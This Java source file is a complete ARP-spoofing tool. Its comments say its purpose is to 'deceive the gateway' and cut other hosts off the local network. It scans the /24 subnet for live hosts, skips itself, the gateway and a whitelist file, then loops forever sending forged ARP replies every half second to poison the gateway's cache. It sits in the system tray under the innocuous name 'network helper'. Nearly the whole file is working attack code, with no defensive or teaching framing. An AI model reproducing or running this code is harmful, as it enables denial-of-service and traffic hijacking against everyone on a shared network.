package arp.hoax.disnet;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import org.apache.commons.io.FileUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;
import java.util.List;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by IntelliJ IDEA.
 *
 * @author NingZe
 * description: hoax
 * path: LEMONBLOG-arp.hoax.disnet-NzArpHoaxDisnet
 * date: 2019/12/25 0025 09:42
 * version: 02.06
 * To change this template use File | Settings | File Templates.
 */
public class NzArpHoaxDisnet {

    public static void main(String[] args) {
        hoaxGatewayDisnet();
    }

    /**
     * 日志
     */
    private final static Logger log = LoggerFactory.getLogger(NzArpHoaxDisnet.class);

    /**
     * 重发间隔时间 TIME * 1000
     */
    public static Double TIME = 0.5;

    /**
     * 是否初始化
     */
    public static Boolean BL = true;

    /**
     * 手动选择网卡重试次数
     */
    public static Integer MANUALNUM = 6;

    /**
     * 输入
     */
    public static Scanner SCANNER = new Scanner(System.in);

    /**
     * 本机IP
     */
    public static String MYIP;

    /**
     * 本机MAC
     */
    public static String MYMAC;

    /**
     * 本机IP对象
     */
    public static InetAddress MYIPOBJ;

    /**
     * 本机MAC数组
     */
    public static byte[] MYMACARR;

    /**
     * 网络段
     */
    public static String NETSEGMENT;

    /**
     * 网关IP
     */
    public static String GATEWAYIP;

    /**
     * 网关MAC
     */
    public static String GATEWAYMAC;

    /**
     * 网关IP对象
     */
    public static InetAddress GATEWAYIPOBJ;

    /**
     * 网关MAC数组
     */
    public static byte[] GATEWAYMACARR;

    /**
     * 存储IP-Mac键值对
     */
    public static Map<String, String> IPANDMACS = new HashMap();

    /**
     * 存储IP
     */
    public static List<String> IPLIS = new ArrayList();

    /**
     * 存活者IP, 用于检测网卡
     */
    public static String ALIVEIP1;

    /**
     * 网卡对象
     */
    public static NetworkInterface DEVICE;

    /**
     * 设备发送对象
     */
    public static JpcapSender SENDER;

    /**
     * 非断网IP配置文件地址
     */
    public static String ARPNOTDISNETPATH = "ArpNotDisnet.txt";

    /**
     * 初始化配置静态代码块
     */
    static {
        try {
            if (BL) {
                // 打开系统托盘
                NetUtil.openSystemTray();
                // 扫描本机IP与MAC
                Map<String, String> locaIpAndMac = NetUtil.findLocaIpAndMac();
                // 本机IP
                MYIP = locaIpAndMac.get("ip");
                // 本机IP对象
                MYIPOBJ = InetAddress.getByName(MYIP);
                // 本机MAC
                MYMAC = locaIpAndMac.get("mac");
                // 本机MAC数组
                MYMACARR = NetUtil.stomac(MYMAC);
                // 网络段
                NETSEGMENT = MYIP.substring(0, MYIP.lastIndexOf("."));
                // 网关IP
                GATEWAYIP = NETSEGMENT + ".1";
                // 网关IP对象
                GATEWAYIPOBJ = InetAddress.getByName(GATEWAYIP);
                // 网关MAC
                GATEWAYMAC = NetUtil.getMacAddress(GATEWAYIPOBJ.getHostName());
                // 网关MAC数组
                GATEWAYMACARR = NetUtil.stomac(GATEWAYMAC);
                // 存活者IP
                ALIVEIP1 = NetUtil.getAliveIp1(NETSEGMENT);
                // 自动打开默认网卡（失败将自动切换为手动打开）
                SENDER = selfOpenDevice();
                // 扫描并存储网段下所有存活主机的IP与MAC
                IPANDMACS = findAllMacAddress(NETSEGMENT, DEVICE, IPLIS);
                // 删除不断网的IP
                IPLIS = removeArpNotDisnet(IPLIS, ARPNOTDISNETPATH, GATEWAYIP, MYIP);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 启动方法-欺骗网关-进行局域网断网
     */
    private static void hoaxGatewayDisnet() {
        log.info("ArpHoaxDisnet starting success .............");
        try {
            // 循环发送ARP应答包
            while (true) {
                for (String tarip : IPLIS) {
                    // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
                    SENDER.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(tarip), GATEWAYMACARR, GATEWAYIPOBJ, 2));
                }
                // 休息 TIME 秒
                Thread.sleep((long) (TIME * 1000));
            }
        } catch (Exception e) {
            log.error("ArpHoaxDisnet exception termination .............", e);
        }
    }

    /**
     * 移除不断网的IP
     *
     * @param iplis
     * @return
     * @throws IOException
     */
    private static List<String> removeArpNotDisnet(List<String> iplis, String arpnotdisnetpath, String gatewayip, String myip) throws IOException {
        log.info("开始移除非断网IP.");
        // 存储ip列表（1.读取文件IP配置 2.网关 3.本地IP地址）
        List<String> relis = new ArrayList(16);
        // 获得项目路径并处理
        String path = System.getProperty("user.dir");
        path = path.substring(0, path.lastIndexOf("\\")) + "\\" + arpnotdisnetpath;
        // 获得文件对象
        File file = FileUtils.getFile(path);
        // 判断文件是否存在
        if (file.exists()) {
            // 存在就按行读取文件内容
            relis.addAll(FileUtils.readLines(file, "UTF-8"));
        }
        relis.add(gatewayip);
        relis.add(myip);
        // del msg
        for (String ip : relis) {
            log.info(ip);
        }
        // 在所有IP列表中移除
        iplis.removeAll(relis);
        log.info("处理完成, 当前 " + iplis.size() + " 个主机存活.");
        return iplis;
    }

    /**
     * 扫描并存储网段下所有存活主机的IP与MAC
     *
     * @throws Exception
     */
    private static Map<String, String> findAllMacAddress(String netsegment, NetworkInterface device, List<String> iplis) throws Exception {
        // 存储 IP-MAC 键值对
        Map<String, String> maps = new HashMap(26);
        // start time
        Long l1 = System.currentTimeMillis();
        // 1. 初始化 1-255 个网络地址，当然也可以自己指定范围（默认情况网关后缀为1，所以从2开始）
        ArrayList<String> list = new ArrayList();
        for (int i = 1; i <= 255; i++) {
            list.add(netsegment + "." + i);
        }
        // 2. 扫描当前局域网中所有存活的主机
        log.info("开始扫描当前局域网所有存活主机, 预计耗时: 60 秒.");
        // 方式一 + 方式二 即可缩小范围以及更精准的获取有效数据信息
        // 方式一：arp 发送请求，以响应结果判断存活主机
        JpcapCaptor captor = JpcapCaptor.openDevice(device, 2000, false, 3000);
        captor.setFilter("arp", true);
        JpcapSender sender = captor.getJpcapSenderInstance();
        for (int i = 0; i < list.size(); i++) {
            // ip（目标ip地址）
            String tarip = list.get(i);
            // 参数介绍
            // 1.网卡MAC地址 2.网卡地址对象中第一个地址对象（其实就是本机地址对象）
            // 3.伪造MAC地址并转换为数组 4.设置需要向其发送ARP请求的主机IP
            sender.sendPacket(constractReqArps(device.mac_address, device.addresses[1].address, NetUtil.stomac("ff-ff-ff-ff-ff-ff"), InetAddress.getByName(tarip), 1));
            // 监听所有捕获到的数据包
            ARPPacket p = (ARPPacket) captor.getPacket();
            if (p == null) {
                // 未获取到返回ARP信息
                continue;
            } else {
                /*
                 * 按照ARP协议的定义，请求目标主机的MAC地址，需要向本局域网内的所有主机广播ARP请求
                 * 挡目标主机监听到此请求
                 * 其会向请求发送方定向的回应自己的MAC地址
                 * 所以我只需要获取响应信息
                 */
                if (p.operation != ARPPacket.ARP_REPLY) {
                    continue;
                }
                // 将byte[]数组解析为标志IP地址
                StringBuilder str = new StringBuilder();
                for (byte part : p.sender_protoaddr) {
                    String hex = (part & 0xff) < 0 ? String.valueOf(part & 0xff + 256) : String.valueOf(part & 0xff);
                    str.append(hex);
                    str.append('.');
                }
                // ip
                String ip = str.toString().substring(0, str.length() - 1);
                /*
                 * 判断目标主机是否存活
                 * 有两种情况会返回MAC地址为00-00-00-00-00-00
                 * 1.目标IP上不存在存活主机
                 * 2.目标主机已做静态绑定 对于静态绑定的主机是无法向路由器篡改其MAC地址的
                 */
                boolean isAlive = false;
                byte[] deadMac = NetUtil.stomac("00-00-00-00-00-00");
                if (!(p.target_hardaddr[0] == deadMac[0]
                        && p.target_hardaddr[1] == deadMac[1] && p.target_hardaddr[2] == deadMac[2]
                        && p.target_hardaddr[3] == deadMac[3] && p.target_hardaddr[4] == deadMac[4]
                        && p.target_hardaddr[5] == deadMac[5])) {
                    isAlive = true;
                }
                if (!isAlive) {
                    // 目标主机未存活
                    continue;
                }
                // 保存可用的目标主机IP-MAC对
                str = new StringBuilder();
                // 解析ARP响应方MAC地址
                for (byte part : p.sender_hardaddr) {
                    String hex = Integer.toHexString(part & 0xff).toUpperCase();
                    str.append(hex.length() == 1 ? "0" + hex : hex);
                    str.append('-');
                }
                // mac
                String mac = str.toString().substring(0, 17);
                // 存储 ip-mac
                maps.put(ip, mac);
                // 存储 ip
                iplis.add(ip);
                // msg
                log.info("IP-> " + ip + "\t,\t" + "MAC-> " + mac);
            }
        }
        // 方式二：arp -a ip 扫描存活主机
        for (int i = 0; i < list.size(); i++) {
            // ip（当前ip地址）
            String tarip = list.get(i);
            // mac（执行cmd命令获得MAC地址）
            String tarmac = NetUtil.getMacAddress(tarip).toUpperCase();
            // 目标ip已存在 or 目标主机的MAC不存在，继续下一轮
            if (maps.containsKey(tarip) || tarmac == null || tarmac.equals("")) {
                continue;
            }
            // 存储 ip-mac
            maps.put(tarip, tarmac);
            // 存储 ip
            iplis.add(tarip);
            // msg
            log.info("IP-> " + tarip + "\t,\t" + "MAC-> " + tarmac);
        }
        // stop time
        Long l2 = System.currentTimeMillis();
        log.info("扫描完成, 一共 " + maps.size() + " 个主机存活, 实际耗时: " + ((l2 - l1) / 1000) + " 秒.");
        return maps;
    }

    /**
     * 自动-打开网卡
     * 例：Realtek公司PCIe接口千兆以太网系列控制器（大多数都是这个呢）- Realtek PCIe GBE Family Controller
     *
     * @return
     */
    private static JpcapSender selfOpenDevice() {
        // 发送者设备
        JpcapSender sender = null;
        // 枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        // 一、自动
        for (int i = 0; i < devices.length; i++) {
            // 1. 保存网卡
            DEVICE = devices[i];
            try {
                // 2. 打开设备
                sender = JpcapSender.openDevice(DEVICE);
                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
                sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
            } catch (Exception e) {
                sender = null;
                e.printStackTrace();
            } finally {
                // 3. 自动打开成功
                if (sender != null) {
                    log.info("自动选择的网卡为: " + DEVICE.description + ".");
                    break;
                }
            }
        }
        // 二、手动
        // 打开失败（指定网卡不存在）
        if (sender == null) {
            log.info("自动打开网卡失败. 正在尝试手动开启, 稍等......");
            // 手动选择并打开设备
            sender = manualOpenDevice();
        }
        // 返回设备
        return sender;
    }

    /**
     * 手动-选择并打开网卡
     *
     * @return
     */
    private static JpcapSender manualOpenDevice() {
        // 发送者设备
        JpcapSender sender = null;
        // 枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            log.info(i + "." + devices[i].description);
        }
        // 重试次数
        int n = 1;
        while (n <= MANUALNUM) {
            // 0. 选择网卡
            log.info("选择一个网卡：");
            // 1. 保存网卡 - 获得指定下标的网卡
            DEVICE = devices[SCANNER.nextInt()];
            try {
                // 2. 打开设备
                sender = JpcapSender.openDevice(DEVICE);
                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
                sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
            } catch (Exception e) {
                sender = null;
                log.info(DEVICE.description + ", 网卡打开失败, 还可重试" + (MANUALNUM - n) + "次.", e);
            } finally {
                // 3. 自动打开成功
                if (sender != null) {
                    log.info("手动选择的网卡为: " + DEVICE.description + ".");
                    break;
                }
                n++;
            }
        }
        // 返回设备
        return sender;
    }

    /**
     * 构造ARP包请求
     */
    private static ARPPacket constractReqArps(byte[] sender_hardaddr, InetAddress sender_protoaddr, byte[] target_hardaddr, InetAddress target_protoaddr, int type) {
        // 设置ARP包
        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        // 请求/接收
        switch (type) {
            case 1:
                // ARP_REQUEST 用于请求目标主机的MAC地址
                arp.operation = ARPPacket.ARP_REQUEST;
                break;
            case 2:
                // ARP_REPLY 用于接受目标主机的MAC地址
                arp.operation = ARPPacket.ARP_REPLY;
                break;
        }
        arp.hlen = ARPPacket.HARDTYPE_IEEE802;
        arp.plen = ARPPacket.RARP_REPLY;
        arp.sender_hardaddr = sender_hardaddr;
        arp.sender_protoaddr = sender_protoaddr.getAddress();
        arp.target_hardaddr = target_hardaddr;
        arp.target_protoaddr = target_protoaddr.getAddress();
        // 设置DLC帧
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = sender_hardaddr;
        ether.dst_mac = target_hardaddr;
        arp.datalink = ether;
        return arp;
    }

    /**
     * @Function: TODO
     * @description: net util class
     * @author: NingZe
     * @date: 2019/12/25 0025 09:47
     * @params:
     * @version: 02.06
     */
    private static class NetUtil {

        /**
         * 获得一个存活者IP
         *
         * @return
         * @throws Exception
         */
        private static String getAliveIp1(String netsegment) throws Exception {
            String result = command("arp -a");
            String regExp = netsegment + ".[0-9]{1,3}";
            Matcher matcher = Pattern.compile(regExp).matcher(result);
            int n = 0;
            while (matcher.find()) {
                if (++n == 3) {
                    return matcher.group();
                }
            }
            return netsegment + ".100";
        }

        /**
         * 执行单条指令
         *
         * @param cmd 命令
         * @return 执行结果
         * @throws Exception
         */
        private static String command(String cmd) throws Exception {
            Process process = Runtime.getRuntime().exec(cmd);
            process.waitFor();
            InputStream in = process.getInputStream();
            StringBuilder result = new StringBuilder();
            byte[] data = new byte[256];
            while (in.read(data) != -1) {
                String encoding = System.getProperty("sun.jnu.encoding");
                result.append(new String(data, encoding));
            }
            return result.toString();
        }

        /**
         * 获取mac地址
         *
         * @param ip
         * @return
         * @throws Exception
         */
        private static String getMacAddress(String ip) throws Exception {
            String result = command("arp -a " + ip);
            String regExp = "([0-9A-Fa-f]{2})([-:][0-9A-Fa-f]{2}){5}";
            Pattern pattern = Pattern.compile(regExp);
            Matcher matcher = pattern.matcher(result);
            StringBuilder mac = new StringBuilder();
            while (matcher.find()) {
                String temp = matcher.group();
                mac.append(temp);
            }
            return mac.toString();
        }

        /**
         * 获得本机IP与MAC（只限于本机）
         *
         * @return
         */
        private static Map<String, String> findLocaIpAndMac() throws Exception {
            // 获得本地地址对象
            final InetAddress ias = InetAddress.getLocalHost();
            // 获得网络接口对象（即网卡），并得到mac地址，mac地址存在于一个byte数组中。
            byte[] mac = java.net.NetworkInterface.getByInetAddress(ias).getHardwareAddress();
            // 下面代码是把mac地址拼装成String
            final StringBuffer sb = new StringBuffer();
            for (int i = 0; i < mac.length; i++) {
                if (i != 0) {
                    sb.append("-");
                }
                // mac[i] & 0xFF 是为了把byte转化为正整数
                String s = Integer.toHexString(mac[i] & 0xFF);
                sb.append(s.length() == 1 ? 0 + s : s);
            }
            return new HashMap(2) {{
                put("ip", ias.getHostAddress());
                put("mac", sb.toString().toUpperCase());
            }};
        }

        /**
         * mac地址转byte数组的方法
         */
        private static byte[] stomac(String s) {
            byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
            String[] s1 = s.split("-");
            for (int x = 0; x < s1.length; x++) {
                mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
            }
            return mac;
        }

        /**
         * 打开系统托盘
         */
        private static void openSystemTray() {
            // 判断系统是否支持托盘
            if (SystemTray.isSupported()) {
                //创建一个托盘图标对象
                TrayIcon trayIcon = new TrayIcon(new ImageIcon(NzArpHoaxDisnet.class.getResource("/img/net.png")).getImage());
                // 创建弹出菜单
                PopupMenu popupMenu = new PopupMenu();
                // 添加一个用于退出的按钮
                MenuItem menuItem = new MenuItem("exit");
                // 点击事件 (退出程序)
                menuItem.addActionListener(e -> System.exit(0));
                popupMenu.add(menuItem);
                // 添加弹出菜单到托盘图标
                trayIcon.setPopupMenu(popupMenu);
                // 提示信息
                String[] msgs = {"网络助手", "名称：网络助手 \\n作者：hoax \\n邮箱：arphoaxdisnet@qq.com \\n版本：2.6 \\n时间：2019.12.26"};
                // 添加工具提示文本
                trayIcon.setToolTip(msgs[0]);
                try {
                    // 获取系统托盘, 并将托盘图表添加到系统托盘
                    SystemTray.getSystemTray().add(trayIcon);
                } catch (AWTException e) {
                    e.printStackTrace();
                }
            } else {
                log.error("你的系统不支持系统托盘");
            }
        }

    }

}
